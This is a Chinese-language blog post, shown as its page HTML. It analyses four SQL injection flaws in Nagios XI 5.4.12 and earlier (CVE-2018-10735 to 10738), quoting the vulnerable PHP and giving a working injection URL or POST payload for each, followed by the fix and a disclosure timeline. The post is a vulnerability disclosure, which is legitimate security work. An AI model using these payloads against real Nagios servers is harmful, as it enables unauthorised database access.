@@ -1,0 +1,711 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="PHP," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="漏洞简介Nagios 是一款开源的免费网络监视工具，能有效监控 Windows、Linux和 Unix 的主机状态，交换机路由器等网络设备，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。Nagios XI 在小于等于 5.4.12 的版本中存在多个 S">
+<meta name="keywords" content="PHP">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NagiosXI &lt;= 5.4.12 多个SQL注入漏洞">
+<meta property="og:url" content="https://badgsd.github.io/2018/05/26/NagiosXI-5-4-12-多个SQL注入漏洞/index.html">
+<meta property="og:site_name" content="Badcode">
+<meta property="og:description" content="漏洞简介Nagios 是一款开源的免费网络监视工具，能有效监控 Windows、Linux和 Unix 的主机状态，交换机路由器等网络设备，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。Nagios XI 在小于等于 5.4.12 的版本中存在多个 SQL 注入漏洞。 漏洞影响 Nagios XI 5.2.x Nagios XI">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://badgsd.github.io/2018/05/26/NagiosXI-5-4-12-多个SQL注入漏洞/commandline.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/05/26/NagiosXI-5-4-12-多个SQL注入漏洞/info.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/05/26/NagiosXI-5-4-12-多个SQL注入漏洞/logbook.png">
+<meta property="og:image" content="https://badgsd.github.io/2018/05/26/NagiosXI-5-4-12-多个SQL注入漏洞/menuaccess.png">
+<meta property="og:updated_time" content="2018-05-26T15:46:36.875Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="NagiosXI &lt;= 5.4.12 多个SQL注入漏洞">
+<meta name="twitter:description" content="漏洞简介Nagios 是一款开源的免费网络监视工具，能有效监控 Windows、Linux和 Unix 的主机状态，交换机路由器等网络设备，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。Nagios XI 在小于等于 5.4.12 的版本中存在多个 SQL 注入漏洞。 漏洞影响 Nagios XI 5.2.x Nagios XI">
+<meta name="twitter:image" content="https://badgsd.github.io/2018/05/26/NagiosXI-5-4-12-多个SQL注入漏洞/commandline.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://badgsd.github.io/2018/05/26/NagiosXI-5-4-12-多个SQL注入漏洞/"/>
+
+
+
+
+
+  <title>NagiosXI <= 5.4.12 多个SQL注入漏洞 | Badcode</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">Badcode</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://badgsd.github.io/2018/05/26/NagiosXI-5-4-12-多个SQL注入漏洞/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Badcode">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Badcode">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">NagiosXI <= 5.4.12 多个SQL注入漏洞</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-26T23:36:50+08:00">
+                2018-05-26
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><p>Nagios 是一款开源的免费网络监视工具，能有效监控 Windows、Linux和 Unix 的主机状态，交换机路由器等网络设备，打印机等。在系统或服务状态异常时发出邮件或短信报警第一时间通知网站运维人员，在状态恢复后发出正常的邮件或短信通知。Nagios XI 在小于等于 5.4.12 的版本中存在多个 SQL 注入漏洞。</p>
+<h3 id="漏洞影响"><a href="#漏洞影响" class="headerlink" title="漏洞影响"></a>漏洞影响</h3><ul>
+<li>Nagios XI 5.2.x</li>
+<li>Nagios XI 5.4.x 小于 5.4.13</li>
+</ul>
+<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><h4 id="commandline-php-SQL-注入漏洞-CVE-2018-10735"><a href="#commandline-php-SQL-注入漏洞-CVE-2018-10735" class="headerlink" title="commandline.php SQL 注入漏洞(CVE-2018-10735)"></a>commandline.php SQL 注入漏洞(CVE-2018-10735)</h4><p><code>nagiosql/admin/commandline.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">$preNoMain 		= <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span>(<span class="string">"../functions/prepend_adm.php"</span>);</span><br><span class="line">$strCommandLine = <span class="string">"&amp;nbsp;"</span>;</span><br><span class="line">$intCount		= <span class="number">0</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Datenbank abfragen</span></span><br><span class="line"><span class="comment">// ===================</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'cname'</span>]) &amp;&amp; ($_GET[<span class="string">'cname'</span>] != <span class="string">""</span>)) &#123;</span><br><span class="line">	$strResult = $myDBClass-&gt;getFieldData(<span class="string">"SELECT command_line FROM tbl_command WHERE id='"</span>.$_GET[<span class="string">'cname'</span>].<span class="string">"'"</span>);</span><br><span class="line">	<span class="keyword">if</span> ($strResult != <span class="keyword">false</span>) &#123;</span><br><span class="line">		$strCommandLine = $strResult;</span><br><span class="line">		$intCount = substr_count($strCommandLine,<span class="string">"ARG"</span>);</span><br><span class="line">		<span class="keyword">if</span> (substr_count($strCommandLine,<span class="string">"ARG8"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			$intCount = <span class="number">8</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (substr_count($strCommandLine,<span class="string">"ARG7"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			$intCount = <span class="number">7</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (substr_count($strCommandLine,<span class="string">"ARG6"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			$intCount = <span class="number">6</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (substr_count($strCommandLine,<span class="string">"ARG5"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			$intCount = <span class="number">5</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (substr_count($strCommandLine,<span class="string">"ARG4"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			$intCount = <span class="number">4</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (substr_count($strCommandLine,<span class="string">"ARG3"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			$intCount = <span class="number">3</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (substr_count($strCommandLine,<span class="string">"ARG2"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			$intCount = <span class="number">2</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> <span class="keyword">if</span> (substr_count($strCommandLine,<span class="string">"ARG1"</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">			$intCount = <span class="number">1</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			$intCount = <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>参数<code>cname</code>是完全没有任何过滤的，直接拼接到了SQL语句中，从而造成SQL注入漏洞。</p>
+<h5 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxx/nagiosql/admin/commandline.php?cname='%20union%20select%20concat(0x7e7e7e,user(),0x7e7e7e)%23</span><br></pre></td></tr></table></figure>
+<p><img src="commandline.png" alt=""></p>
+<h4 id="info-php-SQL-注入漏洞-CVE-2018-10736"><a href="#info-php-SQL-注入漏洞-CVE-2018-10736" class="headerlink" title="info.php SQL 注入漏洞(CVE-2018-10736)"></a>info.php SQL 注入漏洞(CVE-2018-10736)</h4><p><code>nagiosql/admin/info.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">$preNoMain  = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"../functions/prepend_adm.php"</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Übergabeparameter</span></span><br><span class="line"><span class="comment">// =================</span></span><br><span class="line">$chkKey1        = <span class="keyword">isset</span>($_GET[<span class="string">'key1'</span>])    ? $_GET[<span class="string">'key1'</span>]       : <span class="string">""</span>;</span><br><span class="line">$chkKey2        = <span class="keyword">isset</span>($_GET[<span class="string">'key2'</span>])    ? $_GET[<span class="string">'key2'</span>]       : <span class="string">""</span>;</span><br><span class="line">$chkVersion     = <span class="keyword">isset</span>($_GET[<span class="string">'version'</span>]) ? $_GET[<span class="string">'version'</span>]    : <span class="string">""</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daten holen</span></span><br><span class="line"><span class="comment">// ===========</span></span><br><span class="line">$strSQL     = <span class="string">"SELECT `infotext` FROM `tbl_info`</span></span><br><span class="line"><span class="string">         WHERE `key1` = '$chkKey1' AND `key2` = '$chkKey2' AND `version` = '$chkVersion' AND `language` = 'private'"</span>;</span><br><span class="line">$strContentDB = $myDBClass-&gt;getFieldData($strSQL);</span><br><span class="line"><span class="keyword">if</span> ($strContentDB == <span class="string">""</span>) &#123;</span><br><span class="line">  $strSQL     = <span class="string">"SELECT `infotext` FROM `tbl_info`</span></span><br><span class="line"><span class="string">           WHERE `key1` = '$chkKey1' AND `key2` = '$chkKey2' AND `version` = '$chkVersion' AND `language` = 'default'"</span>;</span><br><span class="line">  $strContentDB = $myDBClass-&gt;getFieldData($strSQL);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>参数<code>key1</code>和<code>key2</code>还有<code>version</code>都是没有过滤直接拼接到 SQL 语句中，从而造成 SQL 注入漏洞。</p>
+<h5 id="PoC-1"><a href="#PoC-1" class="headerlink" title="PoC"></a>PoC</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx/nagiosql/admin/info.php?key1='%20union%20select%20concat(0x7e7e7e,user(),0x7e7e7e)%23</span><br></pre></td></tr></table></figure>
+<p><img src="info.png" alt=""></p>
+<h4 id="logbook-php-SQL注入漏洞-CVE-2018-10737"><a href="#logbook-php-SQL注入漏洞-CVE-2018-10737" class="headerlink" title="logbook.php SQL注入漏洞(CVE-2018-10737)"></a>logbook.php SQL注入漏洞(CVE-2018-10737)</h4><p><code>nagiosql/admin/logbook.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">$chkFromLine  = <span class="keyword">isset</span>($_GET[<span class="string">'from_line'</span>])   ? $_GET[<span class="string">'from_line'</span>]+<span class="number">0</span>  : <span class="number">0</span>;</span><br><span class="line">$chkDelFrom   = <span class="keyword">isset</span>($_POST[<span class="string">'txtFrom'</span>])    ? $_POST[<span class="string">'txtFrom'</span>]   : <span class="string">""</span>;</span><br><span class="line">$chkDelTo     = <span class="keyword">isset</span>($_POST[<span class="string">'txtTo'</span>])    ? $_POST[<span class="string">'txtTo'</span>]   : <span class="string">""</span>;</span><br><span class="line">$chkSearch    = <span class="keyword">isset</span>($_POST[<span class="string">'txtSearch'</span>])  ? $_POST[<span class="string">'txtSearch'</span>] : <span class="string">""</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daten löschen</span></span><br><span class="line"><span class="comment">// =============</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'txtFrom'</span>]) &amp;&amp; (($chkDelFrom != <span class="string">""</span>) || ($chkDelTo != <span class="string">""</span>))) &#123;</span><br><span class="line">  $strWhere = <span class="string">""</span>;</span><br><span class="line">  <span class="keyword">if</span> ($chkDelFrom != <span class="string">""</span>) &#123;</span><br><span class="line">    $strWhere .= <span class="string">"AND `time` &gt; '$chkDelFrom 00:00:00'"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ($chkDelTo != <span class="string">""</span>) &#123;</span><br><span class="line">    $strWhere .= <span class="string">"AND `time` &lt; '$chkDelTo 23:59:59'"</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  $strSQL  = <span class="string">"DELETE FROM `tbl_logbook` WHERE 1=1 $strWhere"</span>;</span><br><span class="line">  $booReturn  = $myDBClass-&gt;insertData($strSQL);</span><br><span class="line">  <span class="keyword">if</span> ($booReturn == <span class="keyword">false</span>) &#123;</span><br><span class="line">    $strMessage .= _(<span class="string">'Error while selecting data from database:'</span>).<span class="string">"&lt;br&gt;"</span>.$myDBClass-&gt;strDBError.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $intError = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $strMessage .= _(<span class="string">'Dataset successfully deleted. Affected rows:'</span>).<span class="string">" "</span>.$myDBClass-&gt;intAffectedRows;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Datensuche</span></span><br><span class="line"><span class="comment">// ==========</span></span><br><span class="line"><span class="keyword">if</span> ($chkSearch != <span class="string">""</span>) &#123;</span><br><span class="line">  $strWhere = <span class="string">"WHERE `user` LIKE '%$chkSearch%' OR `ipadress` LIKE '%$chkSearch%' OR `domain` LIKE '%$chkSearch%' OR `entry` LIKE '%$chkSearch%'"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  $strWhere = <span class="string">""</span>;</span><br><span class="line">&#125;</span><br><span class="line">......</span><br></pre></td></tr></table></figure>
+<p>参数<code>txtSearch</code>是完全没有任何过滤的，直接拼接到了SQL语句中，从而造成SQL注入漏洞。</p>
+<h5 id="PoC-2"><a href="#PoC-2" class="headerlink" title="PoC"></a>PoC</h5><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://xxxx/nagiosql/admin/logbook.php</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">postdata</span>: txtSearch=-1%' and (select 1 from(select count(*),concat((select (select (select concat(0x7e,version(),0x7e))) from information_schema.tables limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)#</span><br></pre></td></tr></table></figure>
+<p><img src="logbook.png" alt=""></p>
+<h4 id="menuaccess-php-SQL-注入漏洞-CVE-2018-10738"><a href="#menuaccess-php-SQL-注入漏洞-CVE-2018-10738" class="headerlink" title="menuaccess.php SQL 注入漏洞(CVE-2018-10738)"></a>menuaccess.php SQL 注入漏洞(CVE-2018-10738)</h4><p><code>nagiosql/admin/menuaccess.php</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">$preAccess    = <span class="number">1</span>;</span><br><span class="line">$preFieldvars = <span class="number">1</span>;</span><br><span class="line"><span class="keyword">require</span>(<span class="string">"../functions/prepend_adm.php"</span>);</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Übergabeparameter</span></span><br><span class="line"><span class="comment">// =================</span></span><br><span class="line">$chkSubMenu   = <span class="keyword">isset</span>($_POST[<span class="string">'selSubMenu'</span>]) ? $_POST[<span class="string">'selSubMenu'</span>]+<span class="number">0</span>  : <span class="number">0</span>;</span><br><span class="line">$chkInsKey1   = <span class="keyword">isset</span>($_POST[<span class="string">'chbKey1'</span>])    ? $_POST[<span class="string">'chbKey1'</span>]     : <span class="number">0</span>;</span><br><span class="line">$chkInsKey2   = <span class="keyword">isset</span>($_POST[<span class="string">'chbKey2'</span>])    ? $_POST[<span class="string">'chbKey2'</span>]     : <span class="number">0</span>;</span><br><span class="line">$chkInsKey3   = <span class="keyword">isset</span>($_POST[<span class="string">'chbKey3'</span>])    ? $_POST[<span class="string">'chbKey3'</span>]     : <span class="number">0</span>;</span><br><span class="line">$chkInsKey4   = <span class="keyword">isset</span>($_POST[<span class="string">'chbKey4'</span>])    ? $_POST[<span class="string">'chbKey4'</span>]     : <span class="number">0</span>;</span><br><span class="line">$chkInsKey5   = <span class="keyword">isset</span>($_POST[<span class="string">'chbKey5'</span>])    ? $_POST[<span class="string">'chbKey5'</span>]     : <span class="number">0</span>;</span><br><span class="line">$chkInsKey6   = <span class="keyword">isset</span>($_POST[<span class="string">'chbKey6'</span>])    ? $_POST[<span class="string">'chbKey6'</span>]     : <span class="number">0</span>;</span><br><span class="line">$chkInsKey7   = <span class="keyword">isset</span>($_POST[<span class="string">'chbKey7'</span>])    ? $_POST[<span class="string">'chbKey7'</span>]     : <span class="number">0</span>;</span><br><span class="line">$chkInsKey8   = <span class="keyword">isset</span>($_POST[<span class="string">'chbKey8'</span>])    ? $_POST[<span class="string">'chbKey8'</span>]     : <span class="number">0</span>;</span><br><span class="line"><span class="comment">//</span></span><br><span class="line"><span class="comment">// Daten verarbeiten</span></span><br><span class="line"><span class="comment">// =================</span></span><br><span class="line">$strKeys = $chkInsKey1.$chkInsKey2.$chkInsKey3.$chkInsKey4.$chkInsKey5.$chkInsKey6.$chkInsKey7.$chkInsKey8;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_POST[<span class="string">'subSave'</span>]) &amp;&amp; ($chkSubMenu != <span class="number">0</span>)) &#123;</span><br><span class="line">  $strSQL = <span class="string">"UPDATE `tbl_submenu` SET `access_rights`='$strKeys' WHERE `id`=$chkSubMenu"</span>;</span><br><span class="line">  $booReturn  = $myDBClass-&gt;insertData($strSQL);</span><br><span class="line">  <span class="keyword">if</span> ($booReturn == <span class="keyword">false</span>) &#123;</span><br><span class="line">    $strMessage .= _(<span class="string">'Error while inserting the data to the data base:'</span>).<span class="string">"&lt;br&gt;"</span>.$myDBClass-&gt;strDBError.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    $intError = <span class="number">1</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $strMessage .= _(<span class="string">'Data were successfully inserted to the data base!'</span>);</span><br><span class="line">    $myDataClass-&gt;writeLog(_(<span class="string">'Access keys set for menu item:'</span>).<span class="string">" "</span>.$myDBClass-&gt;getFieldData(<span class="string">"SELECT `item` FROM `tbl_submenu` WHERE `id`=$chkSubMenu"</span>));</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//</span></span><br></pre></td></tr></table></figure>
+<p>参数<code>chbKey1</code>是完全没有任何过滤的，直接拼接到了SQL语句中，从而造成SQL注入漏洞。要进入到SQL语句中，参数<code>subSave</code>不能为空，参数<code>selSubMenu</code>不能为0。</p>
+<h5 id="PoC-3"><a href="#PoC-3" class="headerlink" title="PoC"></a>PoC</h5><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">http://xxxx/nagiosql/admin/menuaccess.php</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">postdata:</span></span><br><span class="line">chbKey1=' or updatexml(2,concat(0x7e,(version())),0) or''#&amp;selSubMenu=1&amp;subSave=1</span><br></pre></td></tr></table></figure>
+<p><img src="menuaccess.png" alt=""></p>
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><ul>
+<li>升级到 5.4.13 版本。</li>
+</ul>
+<h3 id="时间线"><a href="#时间线" class="headerlink" title="时间线"></a>时间线</h3><ul>
+<li>2018年5月3日发现漏洞</li>
+<li>2018年5月4日确定官方已修复该漏洞</li>
+<li>2018年5月5日申请CVE</li>
+<li>2018年5月17日公开漏洞</li>
+</ul>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/PHP/" rel="tag"># PHP</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/05/26/Metinfo-6-0-0-任意文件读取漏洞/" rel="next" title="Metinfo 6.0.0 任意文件读取漏洞">
+                <i class="fa fa-chevron-left"></i> Metinfo 6.0.0 任意文件读取漏洞
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <p class="site-author-name" itemprop="name">Badcode</p>
+              <p class="site-description motion-element" itemprop="description">学习经历</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">7</span>
+                  <span class="site-state-item-name">日志</span>
+                </a>
+              </div>
+            
+
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">标签</span>
+                
+              </div>
+            
+
+          </nav>
+
+          
+
+          <div class="links-of-author motion-element">
+            
+          </div>
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
